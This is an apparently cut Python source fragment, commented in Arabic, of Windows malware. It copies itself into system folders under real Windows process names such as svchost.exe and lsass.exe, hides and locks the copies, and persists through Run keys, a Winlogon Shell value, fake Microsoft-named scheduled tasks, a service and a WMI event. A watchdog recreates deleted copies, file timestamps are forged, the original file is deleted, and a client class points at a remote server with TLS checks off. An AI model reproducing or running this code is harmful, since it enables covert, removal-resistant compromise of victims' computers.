            print(f"🎯 اكتمل تثبيت إدخالات Shell! الإجمالي: {installed_count}")
            return installed_count
            
        except Exception as e:
            print(f"❌ خطأ عام في إدخالات Shell: {e}")
            return 0
    
    def start_intelligent_protection(self):
        """بدء نظام حماية ذكي متقدم مع مراقبة شاملة"""
        def protection_worker():
            # انتظر لبدء النظام بالكامل
            time.sleep(5)
            
            protection_cycle = 0
            last_cleanup_time = time.time()
            
            while True:
                try:
                    protection_cycle += 1
                    
                    with self.creation_lock:
                        # حالة النظام الشاملة
                        system_status = {
                            'missing_files': [],
                            'outdated_files': [],
                            'healthy_files': [],
                            'corrupted_files': [],
                            'protected_files': [],
                            'registry_entries': [],
                            'scheduled_tasks': []
                        }
                        
                        # فحص شامل للملفات
                        for location in self.system_locations:
                            try:
                                if not os.path.exists(location):
                                    system_status['missing_files'].append(os.path.basename(location))
                                else:
                                    # فحص حجم الملف (لا يمكن أن يكون صفراً)
                                    file_size = os.path.getsize(location)
                                    if file_size == 0:
                                        system_status['corrupted_files'].append(os.path.basename(location))
                                        continue
                                    
                                    # فحص تاريخ التعديل (إذا أقدم من 15 دقيقة)
                                    stat = os.stat(location)
                                    file_age = time.time() - stat.st_mtime
                                    
                                    if file_age > 900:  # 15 دقيقة
                                        system_status['outdated_files'].append(os.path.basename(location))
                                    else:
                                        system_status['healthy_files'].append(os.path.basename(location))
                                        
                                    # التحقق من سمة الإخفاء
                                    try:
                                        result = subprocess.run(f'attrib "{location}"', shell=True, capture_output=True, text=True)
                                        if "H" not in result.stdout:
                                            system_status['protected_files'].append(os.path.basename(location))
                                    except:
                                        pass
                                        
                            except Exception as e:
                                system_status['corrupted_files'].append(os.path.basename(location))
                        
                        # فحص الريجستري (كل 10 دورات)
                        if protection_cycle % 10 == 0:
                            system_status['registry_entries'] = self.check_registry_entries()
                        
                        # فحص المهام المجدولة (كل 15 دورة)
                        if protection_cycle % 15 == 0:
                            system_status['scheduled_tasks'] = self.check_scheduled_tasks()
                        
                        # تقرير الحماية (كل 3 دورات)
                        if protection_cycle % 3 == 0:
                            self.print_protection_report(protection_cycle, system_status)
                        
                        # الإصلاح الذكي
                        files_to_recreate = (
                            system_status['missing_files'] + 
                            system_status['outdated_files'] + 
                            system_status['corrupted_files']
                        )
                        
                        if files_to_recreate:
                            print(f"🔄 اكتشاف {len(files_to_recreate)} ملف يحتاج إصلاح: {files_to_recreate}")
                            self.intelligent_repair(files_to_recreate, system_status)
                        
                        # إعادة حماية الملفات (كل 5 دورات)
                        if protection_cycle % 5 == 0:
                            self.reprotect_files(system_status['protected_files'])
                        
                        # تنظيف الذاكرة والملفات المؤقتة (كل 30 دقيقة)
                        if time.time() - last_cleanup_time > 1800:
                            self.system_cleanup()
                            last_cleanup_time = time.time()
                        
                        # إنشاء نسخ احتياطية إضافية إذا لزم الأمر
                        if len(system_status['healthy_files']) < 3:
                            print("⚠️ عدد الملفات السليمة قليل، جاري إنشاء نسخ إضافية...")
                            self.create_emergency_backups()
                    
                    # فاصل ذكي بين الدورات (يتكيف مع حالة النظام)
                    sleep_time = self.calculate_sleep_time(system_status)
                    time.sleep(sleep_time)
                    
                except Exception as e:
                    print(f"⚠️ خطأ في نظام الحماية: {e}")
                    time.sleep(30)  # انتظار أطول في حالة الخطأ
        
        def check_registry_entries(self):
            """فحص إدخالات الريجستري"""
            try:
                registry_entries = []
                check_entries = [
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                ]
                
                for hkey, subkey in check_entries:
                    try:
                        with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ) as key:
                            i = 0
                            while True:
                                try:
                                    name, value, _ = winreg.EnumValue(key, i)
                                    if any(os.path.basename(copy_path) in value for copy_path in self.backup_copies):
                                        registry_entries.append(f"{name}: {os.path.basename(subkey)}")
                                    i += 1
                                except WindowsError:
                                    break
                    except:
                        pass
                
                return registry_entries
            except:
                return []
        
        def check_scheduled_tasks(self):
            """فحص المهام المجدولة"""
            try:
                tasks = []
                result = subprocess.run('schtasks /query /fo list', shell=True, capture_output=True, text=True)
                
                for line in result.stdout.split('\n'):
                    if 'TaskName' in line and any(os.path.basename(copy_path) in line for copy_path in self.backup_copies):
                        tasks.append(line.split(':')[-1].strip())
                
                return tasks
            except:
                return []
        
        def intelligent_repair(self, files_to_recreate, system_status):
            """إصلاح ذكي للملفات التالفة"""
            repair_strategies = [
                self.quick_repair,
                self.advanced_repair,
                self.emergency_repair
            ]
            
            for location in self.system_locations:
                basename = os.path.basename(location)
                if basename in files_to_recreate:
                    # اختيار استراتيجية الإصلاح بناءً على حالة الملف
                    if basename in system_status['corrupted_files']:
                        strategy = self.emergency_repair
                    elif basename in system_status['missing_files']:
                        strategy = self.advanced_repair
                    else:
                        strategy = random.choice(repair_strategies)
                    
                    success = strategy(location, basename)
                    
                    if success:
                        print(f"   ✅ تم إصلاح: {basename}")
                    else:
                        print(f"   ❌ فشل إصلاح: {basename}")
        
        def quick_repair(self, location, basename):
            """إصلاح سريع"""
            try:
                if os.path.exists(location):
                    os.remove(location)
                
                shutil.copy2(self.original_path, location)
                subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
                time.sleep(0.5)
                return True
            except:
                return False
        
        def advanced_repair(self, location, basename):
            """إصلاح متقدم"""
            try:
                # محاولة متعددة
                for attempt in range(3):
                    try:
                        if os.path.exists(location):
                            os.remove(location)
                        
                        shutil.copy2(self.original_path, location)
                        
                        # إخفاء متقدم
                        subprocess.run(f'attrib +h +s +r "{location}"', shell=True, capture_output=True)
                        
                        # تغيير الوقت
                        old_time = time.time() - random.randint(3600, 86400)
                        os.utime(location, (old_time, old_time))
                        
                        time.sleep(1)
                        return True
                        
                    except:
                        time.sleep(2)
                        continue
                
                return False
            except:
                return False
        
        def emergency_repair(self, location, basename):
            """إصلاح طارئ"""
            try:
                # إنشاء في موقع بديل أولاً
                temp_location = location + ".tmp"
                shutil.copy2(self.original_path, temp_location)
                
                if os.path.exists(location):
                    for _ in range(5):  # 5 محاولات
                        try:
                            os.remove(location)
                            break
                        except:
                            time.sleep(1)
                            continue
                
                os.rename(temp_location, location)
                subprocess.run(f'attrib +h +s +r "{location}"', shell=True, capture_output=True)
                time.sleep(2)
                return True
            except:
                return False
        
        def reprotect_files(self, unprotected_files):
            """إعادة حماية الملفات"""
            for location in self.system_locations:
                basename = os.path.basename(location)
                if basename in unprotected_files and os.path.exists(location):
                    try:
                        subprocess.run(f'attrib +h +s +r "{location}"', shell=True, capture_output=True)
                    except:
                        pass
        
        def system_cleanup(self):
            """تنظيف النظام"""
            try:
                # تنظيف الملفات المؤقتة
                temp_dir = os.getenv('TEMP')
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        if file.startswith('system_') and file.endswith('.tmp'):
                            try:
                                os.remove(os.path.join(root, file))
                            except:
                                pass
                
                print("🧹 تم تنظيف الملفات المؤقتة")
            except:
                pass
        
        def create_emergency_backups(self):
            """إنشاء نسخ احتياطية طارئة"""
            try:
                emergency_locations = [
                    os.path.join(os.getenv('TEMP'), f"emergency_{random.randint(10000,99999)}.pyw"),
                    os.path.join(os.getenv('USERPROFILE'), f"temp_{random.randint(10000,99999)}.pyw"),
                ]
                
                for location in emergency_locations:
                    try:
                        shutil.copy2(self.original_path, location)
                        subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
                        self.backup_copies.append(location)
                        print(f"🆘 نسخة طارئة: {os.path.basename(location)}")
                    except:
                        continue
            except:
                pass
        
        def calculate_sleep_time(self, system_status):
            """حساب وقت الانتظار الذكي"""
            base_sleep = 10  # 10 ثواني أساسية
            
            # تقليل وقت الانتظار إذا كانت هناك مشاكل
            if (len(system_status['missing_files']) > 2 or 
                len(system_status['corrupted_files']) > 1):
                return 5  # 5 ثواني فقط
            
            # زيادة وقت الانتظار إذا كان النظام مستقراً
            if (len(system_status['healthy_files']) > 5 and 
                len(system_status['missing_files']) == 0):
                return 30  # 30 ثانية
            
            return base_sleep
        
        def print_protection_report(self, cycle, status):
            """طباعة تقرير الحماية"""
            print(f"\n📊 تقرير الحماية المتقدم - الدورة #{cycle}")
            print(f"   ✅ الملفات السليمة: {len(status['healthy_files'])}")
            print(f"   🔄 الملفات القديمة: {len(status['outdated_files'])}")
            print(f"   ❌ الملفات المفقودة: {len(status['missing_files'])}")
            print(f"   🚨 الملفات التالفة: {len(status['corrupted_files'])}")
            print(f"   🛡️ الملفات غير محمية: {len(status['protected_files'])}")
            
            if status['registry_entries']:
                print(f"   📝 إدخالات ريجستري: {len(status['registry_entries'])}")
            
            if status['scheduled_tasks']:
                print(f"   ⏰ مهام مجدولة: {len(status['scheduled_tasks'])}")
            
            if (len(status['missing_files']) == 0 and 
                len(status['corrupted_files']) == 0):
                print("   🎉 حالة النظام: ممتازة")
            else:
                print("   ⚠️ حالة النظام: تحتاج انتباه")
        
        # تشغيل نظام الحماية
        protection_thread = threading.Thread(target=protection_worker, daemon=True)
        protection_thread.start()
        print("🛡️ بدء نظام الحماية الذكية المتقدم - الإصدار المحسن") 

    def install_complete_independent_system(self):
        """تثبيت النظام المستقل الكامل مع تحسينات متقدمة"""
        print("=" * 60)
        print("🤖 بدء تثبيت النظام المستقل المتقدم...")
        print("=" * 60)
        
        start_time = time.time()
        installation_stats = {
            'copies_created': 0,
            'registry_entries': 0,
            'scheduled_tasks': 0,
            'startup_files': 0,
            'shell_entries': 0,
            'failed_attempts': 0
        }
        
        # المرحلة 0: التحضير الأولي
        print("\n🔧 المرحلة 0: الإعدادات الأولية...")
        try:
            # تحويل الملف إلى .pyw إذا لزم الأمر
            self.convert_to_pyw_if_needed()
            print("   ✅ تحويل الامتداد إلى .pyw")
            
            # ربط امتداد .pyw إذا أمكن
            self.associate_pyw_files()
            print("   ✅ ربط امتداد .pyw")
            
        except Exception as e:
            print(f"   ⚠️  تحذير في الإعدادات: {e}")
        
        # المرحلة 1: إنشاء النسخ المتقدمة
        print("\n📁 المرحلة 1: إنشاء النسخ الاحتياطية المتقدمة...")
        try:
            copies = self.create_multiple_copies()
            installation_stats['copies_created'] = len(copies)
            
            # إنشاء نسخ إضافية إذا كان العدد قليلاً
            if len(copies) < 5:
                print("   🔄 إنشاء نسخ إضافية...")
                additional_copies = self.create_emergency_backups()
                copies.extend(additional_copies)
                installation_stats['copies_created'] = len(copies)
            
            print(f"   📊 النتيجة: {len(copies)} من أصل {len(self.system_locations)} نسخة")
            
            # تشغيل جميع النسخ للتأكد
            print("   🚀 تشغيل النسخ للتأكد...")
            running_copies = 0
            for copy_path in copies:
                if self.start_copy(copy_path):
                    running_copies += 1
                    time.sleep(0.3)  # فاصل بين التشغيل
            
            print(f"   ⚡ النسخ النشطة: {running_copies} من {len(copies)}")
            
        except Exception as e:
            print(f"   ❌ خطأ في إنشاء النسخ: {e}")
            installation_stats['failed_attempts'] += 1
        
        # المرحلة 2: تثبيت الريجستري المتقدم
        print("\n📝 المرحلة 2: تثبيت إدخالات الريجستري المتقدمة...")
        try:
            reg_count = self.install_registry_with_multiple_paths()
            installation_stats['registry_entries'] = reg_count
            
            # محاولات إضافية إذا كانت النتائج ضعيفة
            if reg_count < 3:
                print("   🔄 محاولة تثبيت ريجستري إضافية...")
                additional_reg = self.install_additional_registry_entries()
                reg_count += additional_reg
                installation_stats['registry_entries'] = reg_count
            
            print(f"   📊 النتيجة: {reg_count} إدخال ريجستري")
            
        except Exception as e:
            print(f"   ❌ خطأ في الريجستري: {e}")
            installation_stats['failed_attempts'] += 1
        
        # المرحلة 3: تثبيت المهام المجدولة المتقدمة
        print("\n⏰ المرحلة 3: تثبيت المهام المجدولة المتقدمة...")
        try:
            task_count = self.install_scheduled_tasks_with_multiple_paths()
            installation_stats['scheduled_tasks'] = task_count
            
            # تأكيد المهام المثبتة
            if task_count > 0:
                print("   🔍 التحقق من المهام المثبتة...")
                verified_tasks = self.verify_scheduled_tasks()
                print(f"   ✅ المهام المؤكدة: {verified_tasks}")
            
            print(f"   📊 النتيجة: {task_count} مهمة مجدولة")
            
        except Exception as e:
            print(f"   ❌ خطأ في المهام المجدولة: {e}")
            installation_stats['failed_attempts'] += 1
        
        # المرحلة 4: تثبيت بدء التشغيل المتقدم
        print("\n🚀 المرحلة 4: تثبيت بدء التشغيل المتقدم...")
        try:
            startup_count = self.install_startup_with_multiple_paths()
            installation_stats['startup_files'] = startup_count
            
            # التحقق من ملفات بدء التشغيل
            active_startup = self.check_active_startup_files()
            print(f"   🔍 ملفات بدء التشغيل النشطة: {active_startup}")
            
            print(f"   📊 النتيجة: {startup_count} ملف بدء تشغيل")
            
        except Exception as e:
            print(f"   ❌ خطأ في بدء التشغيل: {e}")
            installation_stats['failed_attempts'] += 1
        
        # المرحلة 5: تثبيت إدخالات Shell المتقدمة
        print("\n🐚 المرحلة 5: تثبيت إدخالات Shell المتقدمة...")
        try:
            shell_count = self.install_shell_entries_with_multiple_paths()
            installation_stats['shell_entries'] = shell_count
            
            # تثبيت إضافي لإدخالات Shell
            if shell_count < 5:
                print("   🔄 تثبيت إدخالات Shell إضافية...")
                additional_shell = self.install_additional_shell_entries()
                shell_count += additional_shell
                installation_stats['shell_entries'] = shell_count
            
            print(f"   📊 النتيجة: {shell_count} إدخال Shell")
            
        except Exception as e:
            print(f"   ❌ خطأ في إدخالات Shell: {e}")
            installation_stats['failed_attempts'] += 1
        
        # المرحلة 6: بدء نظام الحماية المتقدم
        print("\n🛡️ المرحلة 6: بدء نظام الحماية المتقدم...")
        try:
            self.start_intelligent_protection()
            
            # بدء أنظمة حماية إضافية
            self.start_additional_protection_systems()
            print("   ✅ أنظمة الحماية الإضافية مفعلة")
            
            print("   📊 نظام الحماية الذكية يعمل بنجاح")
            
        except Exception as e:
            print(f"   ❌ خطأ في نظام الحماية: {e}")
            installation_stats['failed_attempts'] += 1
        
        # المرحلة 7: التحقق النهائي والتقارير
        print("\n📋 المرحلة 7: التحقق النهائي والتقارير...")
        try:
            # تقرير الأداء
            total_time = time.time() - start_time
            total_methods = (installation_stats['registry_entries'] + 
                            installation_stats['scheduled_tasks'] + 
                            installation_stats['startup_files'] + 
                            installation_stats['shell_entries'])
            
            # تقييم نجاح التثبيت
            success_rate = self.calculate_success_rate(installation_stats)
            
            print("=" * 60)
            print("🎯 تقرير التثبيت النهائي:")
            print("=" * 60)
            print(f"   📁 النسخ الم创建的: {installation_stats['copies_created']}")
            print(f"   📝 إدخالات الريجستري: {installation_stats['registry_entries']}")
            print(f"   ⏰ المهام المجدولة: {installation_stats['scheduled_tasks']}")
            print(f"   🚀 ملفات بدء التشغيل: {installation_stats['startup_files']}")
            print(f"   🐚 إدخالات Shell: {installation_stats['shell_entries']}")
            print(f"   ❌ المحاولات الفاشلة: {installation_stats['failed_attempts']}")
            print(f"   ⏱️ وقت التثبيت: {total_time:.2f} ثانية")
            print(f"   📈 معدل النجاح: {success_rate}%")
            print(f"   🎯 الإجمالي: {total_methods} طريقة تشغيل تلقائي!")
            
            # توصيات بناءً على النتائج
            self.provide_installation_recommendations(installation_stats)
            
            if success_rate >= 70:
                print("\n✅ النظام المستقل جاهز بالكامل - يمكن حذف الملف الأصلي!")
                print("🔒 النظام سيعمل تلقائياً بعد إعادة التشغيل")
            else:
                print("\n⚠️  التثبيت ناجح جزئياً - يوصى بإعادة التشغيل والتحقق")
                
        except Exception as e:
            print(f"   ❌ خطأ في التقرير النهائي: {e}")
        
        return total_methods

    # الدوال المساعدة الجديدة
    def install_additional_registry_entries(self):
        """تثبيت إدخالات ريجستري إضافية"""
        try:
            additional_count = 0
            extra_entries = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "StartupApproved"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "StartupApproved"),
            ]
            
            for hkey, subkey, value_name in extra_entries:
                try:
                    if self.backup_copies:
                        random_path = random.choice(self.backup_copies)
                    else:
                        random_path = self.original_path
                    
                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0, False"')
                    
                    additional_count += 1
                except:
                    continue
            
            return additional_count
        except:
            return 0

    def verify_scheduled_tasks(self):
        """التحقق من المهام المجدولة المثبتة"""
        try:
            verified_count = 0
            result = subprocess.run('schtasks /query /fo list', shell=True, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if any(os.path.basename(copy_path) in line for copy_path in self.backup_copies):
                    verified_count += 1
            
            return verified_count
        except:
            return 0

    def check_active_startup_files(self):
        """التحقق من ملفات بدء التشغيل النشطة"""
        try:
            active_count = 0
            startup_folders = [
                os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            ]
            
            for folder in startup_folders:
                if os.path.exists(folder):
                    for file in os.listdir(folder):
                        if file.endswith(('.vbs', '.js', '.wsf', '.cmd', '.bat')):
                            active_count += 1
            
            return active_count
        except:
            return 0

    def install_additional_shell_entries(self):
        """تثبيت إدخالات Shell إضافية"""
        try:
            additional_count = 0
            extra_shell_entries = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "ShellState"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "ShellState"),
            ]
            
            for hkey, subkey, value_name in extra_shell_entries:
                try:
                    if self.backup_copies:
                        random_path = random.choice(self.backup_copies)
                    else:
                        random_path = self.original_path
                    
                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0, False"')
                    
                    additional_count += 1
                except:
                    continue
            
            return additional_count
        except:
            return 0

    def start_additional_protection_systems(self):
        """بدء أنظمة حماية إضافية"""
        try:
            # بدء مراقبة الريجستري
            registry_monitor_thread = threading.Thread(target=self.monitor_registry_changes, daemon=True)
            registry_monitor_thread.start()
            
            # بدء مراقبة الملفات
            file_monitor_thread = threading.Thread(target=self.monitor_critical_files, daemon=True)
            file_monitor_thread.start()
            
            return True
        except:
            return False

    def calculate_success_rate(self, stats):
        """حساب معدل نجاح التثبيت"""
        total_attempts = (stats['copies_created'] + stats['registry_entries'] + 
                        stats['scheduled_tasks'] + stats['startup_files'] + 
                        stats['shell_entries'])
        
        if total_attempts == 0:
            return 0
        
        success_rate = (total_attempts / (total_attempts + stats['failed_attempts'])) * 100
        return round(success_rate, 1)

    def provide_installation_recommendations(self, stats):
        """تقديم توصيات بناءً على نتائج التثبيت"""
        recommendations = []
        
        if stats['copies_created'] < 3:
            recommendations.append("• إنشاء المزيد من النسخ الاحتياطية")
        
        if stats['registry_entries'] < 2:
            recommendations.append("• إضافة المزيد من إدخالات الريجستري")
        
        if stats['scheduled_tasks'] < 1:
            recommendations.append("• تثبيت المهام المجدولة")
        
        if stats['startup_files'] < 2:
            recommendations.append("• زيادة ملفات بدء التشغيل")
        
        if recommendations:
            print("\n💡 التوصيات:")
            for recommendation in recommendations:
                print(f"   {recommendation}")

    def delete_original_and_switch(self):
        """حذف آمن للملف الأصلي مع التأكد من عمل النسخ"""
        try:
            if not os.path.exists(self.original_path):
                print("ℹ️ الملف الأصلي غير موجود بالفعل")
                return True
            
            print("🔍 التحقق من النسخ الاحتياطية قبل الحذف...")
            
            # التحقق من وجود نسخ احتياطية نشطة
            active_copies = []
            for location in self.backup_copies:
                if os.path.exists(location):
                    active_copies.append(location)
            
            print(f"📊 النسخ النشطة: {len(active_copies)} من أصل {len(self.backup_copies)}")
            
            if len(active_copies) >= 2:  # على الأقل نسختين
                print("🔄 تشغيل النسخ الاحتياطية للتأكد...")
                
                # تشغيل جميع النسخ النشطة
                started_count = 0
                for copy_path in active_copies:
                    if self.start_copy(copy_path):
                        started_count += 1
                        time.sleep(0.5)  # انتظر نصف ثانية بين كل تشغيل
                
                print(f"🚀 تم تشغيل {started_count} نسخة احتياطية")
                
                if started_count >= 2:
                    print("⏳ انتظر 3 ثوانٍ للتأكد من التشغيل...")
                    time.sleep(3)
                    
                    print("🗑️ جاري حذف الملف الأصلي...")
                    os.remove(self.original_path)
                    
                    # التحقق النهائي من الحذف
                    if not os.path.exists(self.original_path):
                        print("✅ تم حذف الملف الأصلي بنجاح!")
                        print("🎯 النظام الآن يعمل من النسخ الاحتياطية فقط")
                        return True
                    else:
                        print("⚠️ لم يتم حذف الملف الأصلي (مشكلة في الصلاحيات)")
                        return False
                else:
                    print("❌ لم يتم تشغيل نسخ كافية، إلغاء الحذف")
                    return False
            else:
                print("❌ لا توجد نسخ احتياطية كافية، إلغاء الحذف")
                return False
                
        except Exception as e:
            print(f"❌ خطأ في حذف الملف الأصلي: {e}")
            return False


# === النظام اللانهائي مع النسخ المستقل ===
class InfinitePermanentSystem:
    def __init__(self, server_url="https://game-python-1.onrender.com"):
        self.server_url = server_url
        self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
        self.running = True
        self.registered = False
        self.original_path = os.path.abspath(__file__)
        self.encryption = EncryptionSystem()
        self.replication = IndependentReplicationSystem()
        
        # أسماء نظام Windows الحقيقية والمختلفة
        self.system_names = [
            "svchost.exe", "csrss.exe", "services.exe", "lsass.exe",
            "winlogon.exe", "spoolsv.exe", "taskhost.exe", "dwm.exe",
            "audiodg.exe", "WUDFHost.exe", "RuntimeBroker.exe",
            "backgroundTaskHost.exe", "sihost.exe", "ctfmon.exe",
            "SearchIndexer.exe", "SecurityHealthService.exe",
            "wlanext.exe", "conhost.exe", "dllhost.exe", "smss.exe"
        ]
        
        self.hidden_copies = []
        self.used_names = set()
        self.main_copy_path = None
        
        # إعدادات الاتصال الآمن
        self.session = requests.Session()
        self.session.verify = False
        self.timeout = 20
        
        # نظام المراقبة المتبادلة
        self.monitor_threads = []
        
        print(f"🔒 SYSTEM ID: {self.client_id}")
    
    def is_admin(self):
        """التحقق من صلاحيات المدير"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def hide_console(self):
        """إخفاء نافذة الأوامر"""
        try:
            if os.name == 'nt':
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def get_unique_system_name(self):
        """الحصول على اسم نظامي فريد"""
        available_names = [name for name in self.system_names if name not in self.used_names]
        if not available_names:
            # إذا استخدمنا جميع الأسماء، نعيد استخدام بعضها
            self.used_names.clear()
            available_names = self.system_names
        
        chosen_name = random.choice(available_names)
        self.used_names.add(chosen_name)
        return chosen_name
    
    def create_infinite_copies(self):
        """إنشاء نسخ لا نهائية بأسماء مختلفة"""
        try:
            system_locations = [
                # مواقع نظام أساسية
                os.path.join(os.environ['WINDIR'], 'System32'),
                os.path.join(os.environ['WINDIR'], 'SysWOW64'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows'),
                
                # مواقع برامج Microsoft
                os.path.join(os.environ['PROGRAMFILES'], 'Windows Defender'),
                os.path.join(os.environ['PROGRAMFILES(X86)'], 'Windows Defender'),
                os.path.join(os.environ['PROGRAMFILES'], 'Common Files', 'Microsoft Shared'),
                
                # مواقع مستخدم مخفية
                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Windows'),
                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp'),
                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows'),
                
                # مواقع إضافية للتكرار
                os.path.join(os.environ['SYSTEMDRIVE'], 'Windows', 'Temp'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Network'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Crypto'),
            ]
            
            created_count = 0
            target_copies = 5  # 5 نسخ كحد أدنى
            
            for location in system_locations:
                if created_count >= target_copies:
                    break
                    
                try:
                    # اسم فريد لكل نسخة
                    system_name = self.get_unique_system_name()
                    copy_path = os.path.join(location, system_name)
                    
                    # إنشاء المجلد إذا لم يكن موجوداً
                    os.makedirs(os.path.dirname(copy_path), exist_ok=True)
                    
                    # التحقق من عدم وجود النسخة مسبقاً
                    if not os.path.exists(copy_path):
                        # نسخ الملف
                        shutil.copy2(self.original_path, copy_path)
                        
                        # تشفير الملف النسخة
                        self.encrypt_file(copy_path)
                        
                        # إخفاء الملف وإضافة حماية
                        try:
                            subprocess.run(f'attrib +s +h +r "{copy_path}"', shell=True, capture_output=True, timeout=3)
                            # منع الوصول
                            subprocess.run(f'icacls "{copy_path}" /deny Everyone:F', shell=True, capture_output=True)
                        except:
                            pass
                        
                        self.hidden_copies.append(copy_path)
                        created_count += 1
                        
                        # تعيين النسخة الرئيسية الأولى
                        if self.main_copy_path is None:
                            self.main_copy_path = copy_path
                        
                        print(f"✅ نسخة نظامية: {system_name} → {location}")
                        
                except Exception as e:
                    continue
            
            print(f"📁 تم إنشاء {created_count} نسخة نظامية بأسماء مختلفة")
            return created_count
            
        except Exception as e:
            print(f"❌ خطأ في إنشاء النسخ: {e}")
            return 0
    
    def encrypt_file(self, file_path):
        """تشفير ملف النسخة"""
        try:
            with open(file_path, 'rb') as f:
                original_content = f.read()
            
            # إضافة توقيع النظام
            system_signature = f"INFINITE_SYSTEM:{self.client_id}:{time.time()}"
            encrypted_content = self.encryption.encrypt_data(original_content + system_signature.encode())
            
            with open(file_path, 'wb') as f:
                f.write(encrypted_content)
                
        except Exception as e:
            print(f"⚠️  لم يتم تشفير الملف: {e}")
    
    def install_eternal_persistence(self):
        """تثبيت استمرارية أبدية"""
        persistence_count = 0
        
        try:
            # 1. المهام المجدولة المتعددة
            scheduled_tasks = [
                "Microsoft\\Windows\\SystemRestore",
                "Microsoft\\Windows\\DiskCleanup", 
                "Microsoft\\Windows\\Defrag",
                "Microsoft\\Windows\\WindowsUpdate",
                "Microsoft\\Windows\\Maintenance",
                "Microsoft\\Windows\\Diagnosis"
            ]
            
            for task_name in scheduled_tasks:
                try:
                    # استخدام نسخة عشوائية مختلفة لكل مهمة
                    random_copy = random.choice(self.hidden_copies) if self.hidden_copies else self.original_path
                    task_cmd = f'schtasks /create /tn "{task_name}" /tr "\"{random_copy}\"" /sc onlogon /f'
                    result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        persistence_count += 1
                        print(f"✅ مهمة مجدولة: {task_name}")
                except:
                    continue
            
            # 2. الريجستري المتعدد
            registry_entries = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsAudio"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemHealth"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"),
            ]
            
            for hkey, subkey, value_name in registry_entries:
                try:
                    random_copy = random.choice(self.hidden_copies) if self.hidden_copies else self.original_path
                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{random_copy}"')
                    persistence_count += 1
                    print(f"✅ ريجستري: {value_name}")
                except:
                    continue
            
            # 3. خدمات Windows
            try:
                service_cmd = f'sc create "WindowsAudioService" binPath= "\"{self.main_copy_path}\" start= auto'
                subprocess.run(service_cmd, shell=True, capture_output=True)
                persistence_count += 1
                print("✅ خدمة نظام")
            except:
                pass
            
            # 4. WMI Event
            try:
                wmi_script = f"""
                $query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
                Register-WmiEvent -Query $query -Action {{ & "{self.main_copy_path}" }}
                """
                subprocess.run(["powershell", "-Command", wmi_script], capture_output=True)
                persistence_count += 1
                print("✅ حدث WMI")
            except:
                pass
                
            print(f"🔧 تم تثبيت {persistence_count} طريقة استمرارية أبدية")
            return persistence_count
            
        except Exception as e:
            print(f"❌ خطأ في الاستمرارية: {e}")
            return 0

    def install_independent_replication_system(self):
        """تثبيت نظام النسخ المستقل الجديد"""
        print("🤖 تثبيت النظام المستقل - البقاء بعد الحذف...")
        return self.replication.install_complete_independent_system()

    def delete_original_and_switch_to_backup(self):
        """حذف الملف الأصلي والتبديل للنسخ الاحتياطية"""
        print("🔄 بدء عملية الحذف والتبديل...")
        success = self.replication.delete_original_and_switch()
        if success:
            print("🎯 النظام الآن يعمل من النسخ الاحتياطية فقط!")
            print("🔒 الملف الأصلي تم حذفه بنجاح")
        return success
    
    def start_mutual_monitoring(self):
        """بدء المراقبة المتبادلة بين النسخ"""
        def monitor_copies():
            while self.running:
                try:
                    current_time = time.time()
                    damaged_copies = []
                    
                    # فحص كل النسخ
                    for copy_path in self.hidden_copies[:]:
                        try:
                            # التحقق من وجود النسخة
                            if not os.path.exists(copy_path):
                                damaged_copies.append(copy_path)
                                continue
                            
                            # التحقق من تاريخ التعديل (إذا كان قديم جداً قد يكون تالف)
                            stat = os.stat(copy_path)
                            if current_time - stat.st_mtime > 3600:  # ساعة
                                print(f"🔄 تجديد نسخة قديمة: {os.path.basename(copy_path)}")
                                self.recreate_copy(copy_path)
                                
                        except Exception:
                            damaged_copies.append(copy_path)
                    
